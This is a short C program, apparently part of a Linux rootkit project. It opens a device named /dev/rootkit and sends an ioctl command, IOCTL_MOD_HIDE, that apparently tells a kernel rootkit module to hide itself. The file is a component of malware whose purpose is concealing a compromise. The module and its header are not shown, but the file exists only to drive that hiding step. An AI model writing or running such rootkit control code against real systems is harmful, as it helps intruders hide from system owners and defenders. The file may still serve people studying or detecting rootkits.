#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include "rootkit.h"

int main (void) {
    int fd = open("/dev/rootkit", O_RDWR);
    ioctl(fd, IOCTL_MOD_HIDE);
}
